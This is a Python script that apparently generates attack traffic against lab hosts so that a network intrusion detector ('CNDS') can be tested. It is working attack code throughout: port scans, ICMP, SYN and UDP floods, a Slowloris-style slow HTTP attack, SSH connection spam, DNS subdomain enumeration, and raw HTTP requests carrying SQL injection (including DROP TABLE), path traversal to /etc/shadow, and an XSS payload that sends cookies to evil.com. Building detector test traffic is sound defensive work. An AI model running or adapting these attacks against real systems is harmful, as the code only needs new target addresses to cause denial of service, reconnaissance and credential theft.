#!/usr/bin/env python3
"""attacker_traffic.py — Generates realistic attack traffic.

Cycles through multiple attack scenarios with configurable delays.
Each attack produces real network packets visible to the CNDS detector.

Attacks:
  1. TCP SYN scan (port scan) — triggers port_scan rule
  2. ICMP flood — triggers icmp_flood rule
  3. HTTP with SQL injection payload — triggers sql_injection rule
  4. HTTP with XSS payload — triggers xss rule
  5. HTTP with path traversal — triggers path_traversal rule
  6. SYN flood (DoS) — triggers rate_spike / DoS detection
  7. UDP flood — triggers volumetric anomaly
  8. SSH brute force — triggers rate_spike on port 22
  9. DNS amplification probe — unusual DNS patterns
  10. Slow HTTP attack — many half-open connections
"""

import asyncio
import logging
import os
import random
import socket
import struct
import time

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [attacker] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("attacker")

TARGETS = os.getenv("TARGETS", "172.28.0.10,172.28.0.11,172.28.0.12").split(",")
ATTACK_DELAY = int(os.getenv("ATTACK_DELAY", "30"))  # seconds between attacks
DNS_SERVER = os.getenv("DNS_SERVER", "172.28.0.2")


# ─── Attack: TCP SYN Scan ─────────────────────────────────────────────────────

async def attack_syn_scan():
    """Scan 50+ ports on a target — triggers port_scan rule (threshold=10)."""
    target = random.choice(TARGETS)
    ports = random.sample(range(1, 1024), 50) + random.sample(range(1024, 65535), 20)
    log.info("SYN SCAN → %s (%d ports)", target, len(ports))

    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect_ex((target, port))
            sock.close()
        except OSError:
            pass
        await asyncio.sleep(0.02)  # Fast but not instant


# ─── Attack: ICMP Flood ───────────────────────────────────────────────────────

async def attack_icmp_flood():
    """Send 100+ ICMP echo requests rapidly — triggers icmp_flood (threshold=20)."""
    target = random.choice(TARGETS)
    count = random.randint(80, 150)
    log.info("ICMP FLOOD → %s (%d packets)", target, count)

    for i in range(count):
        os.system(f"ping -c 1 -W 0 -i 0 {target} > /dev/null 2>&1 &")
        if i % 10 == 0:
            await asyncio.sleep(0.05)


# ─── Attack: SQL Injection ─────────────────────────────────────────────────────

async def attack_sql_injection():
    """Send HTTP requests with SQL injection payloads."""
    target = random.choice(TARGETS)
    payloads = [
        "GET /login?user=admin'%20OR%201=1-- HTTP/1.1\r\nHost: {t}\r\n\r\n",
        "POST /api/login HTTP/1.1\r\nHost: {t}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 45\r\n\r\nusername=admin'%20UNION%20SELECT%20*%20FROM%20users--&password=x",
        "GET /search?q=1';DROP%20TABLE%20users;-- HTTP/1.1\r\nHost: {t}\r\n\r\n",
        "GET /products?id=1%20AND%201=1%20UNION%20SELECT%20NULL,username,password%20FROM%20users HTTP/1.1\r\nHost: {t}\r\n\r\n",
        "POST /comment HTTP/1.1\r\nHost: {t}\r\nContent-Length: 60\r\n\r\nbody=test'%3B%20INSERT%20INTO%20admin(user,pass)%20VALUES('hax','hax')",
    ]
    log.info("SQL INJECTION → %s (%d payloads)", target, len(payloads))

    for payload_tpl in payloads:
        payload = payload_tpl.format(t=target)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((target, 80))
            sock.sendall(payload.encode())
            try:
                sock.recv(4096)
            except socket.timeout:
                pass
            sock.close()
        except (OSError, ConnectionRefusedError):
            pass
        await asyncio.sleep(0.5)


# ─── Attack: XSS ──────────────────────────────────────────────────────────────

async def attack_xss():
    """Send HTTP requests with XSS payloads."""
    target = random.choice(TARGETS)
    payloads = [
        "GET /search?q=<script>alert('XSS')</script> HTTP/1.1\r\nHost: {t}\r\n\r\n",
        "GET /page?name=<img%20src=x%20onerror=alert(1)> HTTP/1.1\r\nHost: {t}\r\n\r\n",
        "POST /feedback HTTP/1.1\r\nHost: {t}\r\nContent-Length: 52\r\n\r\nmessage=<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        "GET /profile?bio=<svg%20onload=alert(document.domain)> HTTP/1.1\r\nHost: {t}\r\n\r\n",
    ]
    log.info("XSS → %s (%d payloads)", target, len(payloads))

    for payload_tpl in payloads:
        payload = payload_tpl.format(t=target)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((target, 80))
            sock.sendall(payload.encode())
            try:
                sock.recv(4096)
            except socket.timeout:
                pass
            sock.close()
        except (OSError, ConnectionRefusedError):
            pass
        await asyncio.sleep(0.3)


# ─── Attack: Path Traversal / LFI ─────────────────────────────────────────────

async def attack_path_traversal():
    """Send path traversal / LFI attempts."""
    target = random.choice(TARGETS)
    paths = [
        "GET /../../etc/passwd HTTP/1.1\r\nHost: {t}\r\n\r\n",
        "GET /file?name=../../../etc/shadow HTTP/1.1\r\nHost: {t}\r\n\r\n",
        "GET /download?path=....//....//....//etc/passwd HTTP/1.1\r\nHost: {t}\r\n\r\n",
        "GET /view?file=/proc/self/environ HTTP/1.1\r\nHost: {t}\r\n\r\n",
        "GET /include?page=php://filter/convert.base64-encode/resource=config HTTP/1.1\r\nHost: {t}\r\n\r\n",
    ]
    log.info("PATH TRAVERSAL → %s (%d attempts)", target, len(paths))

    for path_tpl in paths:
        path = path_tpl.format(t=target)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((target, 80))
            sock.sendall(path.encode())
            try:
                sock.recv(4096)
            except socket.timeout:
                pass
            sock.close()
        except (OSError, ConnectionRefusedError):
            pass
        await asyncio.sleep(0.3)


# ─── Attack: SYN Flood (DoS) ──────────────────────────────────────────────────

async def attack_syn_flood():
    """Rapid SYN connections to a single port — DoS pattern."""
    target = random.choice(TARGETS)
    port = random.choice([80, 443, 8080, 22])
    count = random.randint(100, 200)
    log.info("SYN FLOOD → %s:%d (%d connections)", target, port, count)

    for _ in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((target, port))
            # Don't close immediately — leave half-open
            sock.close()
        except OSError:
            pass
        await asyncio.sleep(0.01)


# ─── Attack: UDP Flood ─────────────────────────────────────────────────────────

async def attack_udp_flood():
    """High-volume UDP to random ports — volumetric anomaly."""
    target = random.choice(TARGETS)
    count = random.randint(200, 500)
    log.info("UDP FLOOD → %s (%d packets)", target, count)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(count):
            port = random.randint(1, 65535)
            sock.sendto(os.urandom(random.randint(64, 1400)), (target, port))
            await asyncio.sleep(0.005)
        sock.close()
    except OSError:
        pass


# ─── Attack: SSH Brute Force ──────────────────────────────────────────────────

async def attack_ssh_bruteforce():
    """Rapid SSH connection attempts — simulates credential stuffing."""
    target = random.choice(TARGETS)
    attempts = random.randint(30, 60)
    log.info("SSH BRUTEFORCE → %s (%d attempts)", target, attempts)

    for i in range(attempts):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect((target, 22))
            sock.sendall(f"SSH-2.0-libssh_0.9.{i}\r\n".encode())
            try:
                sock.recv(256)
            except socket.timeout:
                pass
            sock.close()
        except (OSError, ConnectionRefusedError):
            pass
        await asyncio.sleep(0.1)


# ─── Attack: DNS Enumeration ──────────────────────────────────────────────────

async def attack_dns_enum():
    """Rapid DNS queries for subdomains — recon pattern."""
    subdomains = [
        "admin", "mail", "ftp", "ssh", "vpn", "api", "dev", "staging",
        "test", "db", "mysql", "postgres", "redis", "elastic", "kibana",
        "jenkins", "gitlab", "internal", "intranet", "backup", "monitor",
        "grafana", "prometheus", "vault", "consul", "k8s", "docker",
        "nas", "fileserver", "print", "camera",
    ]
    domain = "target.local"
    log.info("DNS ENUM → %s.* (%d subdomains)", domain, len(subdomains))

    for sub in subdomains:
        fqdn = f"{sub}.{domain}"
        # Build DNS query
        tx_id = random.randint(0, 65535)
        header = struct.pack(">HHHHHH", tx_id, 0x0100, 1, 0, 0, 0)
        question = b""
        for label in fqdn.split("."):
            question += struct.pack("B", len(label)) + label.encode()
        question += b"\x00\x00\x01\x00\x01"
        packet = header + question

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            sock.sendto(packet, (DNS_SERVER, 53))
            sock.recv(512)
            sock.close()
        except (socket.timeout, OSError):
            pass
        await asyncio.sleep(0.05)


# ─── Attack: Slow HTTP (Slowloris-style) ──────────────────────────────────────

async def attack_slow_http():
    """Open many connections and send headers slowly — exhausts server."""
    target = random.choice(TARGETS)
    num_conns = 20
    log.info("SLOW HTTP → %s (%d connections)", target, num_conns)

    sockets = []
    for _ in range(num_conns):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4.0)
            sock.connect((target, 80))
            sock.sendall(b"GET / HTTP/1.1\r\nHost: target\r\n")
            sockets.append(sock)
        except (OSError, ConnectionRefusedError):
            pass

    # Keep connections alive with partial headers
    for _ in range(5):
        await asyncio.sleep(2.0)
        for sock in sockets:
            try:
                sock.sendall(f"X-Slow-{random.randint(0,9999)}: keep-alive\r\n".encode())
            except OSError:
                pass

    # Cleanup
    for sock in sockets:
        try:
            sock.close()
        except OSError:
            pass


# ─── Attack Orchestrator ───────────────────────────────────────────────────────

ATTACKS = [
    ("SYN Scan", attack_syn_scan),
    ("ICMP Flood", attack_icmp_flood),
    ("SQL Injection", attack_sql_injection),
    ("XSS", attack_xss),
    ("Path Traversal", attack_path_traversal),
    ("SYN Flood (DoS)", attack_syn_flood),
    ("UDP Flood", attack_udp_flood),
    ("SSH Brute Force", attack_ssh_bruteforce),
    ("DNS Enumeration", attack_dns_enum),
    ("Slow HTTP", attack_slow_http),
]


async def main():
    log.info("Attacker starting — targets: %s, delay between attacks: %ds", TARGETS, ATTACK_DELAY)

    # Wait for the network to stabilize and detector to start capturing
    log.info("Waiting 15s for detector to initialize...")
    await asyncio.sleep(15)

    cycle = 0
    while True:
        cycle += 1
        # Pick a random subset of attacks for this cycle (3-5 attacks)
        num_attacks = random.randint(3, 5)
        attacks = random.sample(ATTACKS, num_attacks)

        log.info("═══ Cycle %d: executing %d attacks ═══", cycle, num_attacks)

        for name, fn in attacks:
            log.info("▶ Starting attack: %s", name)
            try:
                await fn()
            except Exception as e:
                log.error("Attack %s failed: %s", name, e)
            log.info("◀ Finished: %s", name)

            # Delay between attacks within a cycle
            inter_delay = random.uniform(5, 15)
            log.info("  (waiting %.0fs before next attack)", inter_delay)
            await asyncio.sleep(inter_delay)

        # Delay between cycles
        log.info("═══ Cycle %d complete. Waiting %ds before next cycle ═══", cycle, ATTACK_DELAY)
        await asyncio.sleep(ATTACK_DELAY)


if __name__ == "__main__":
    asyncio.run(main())
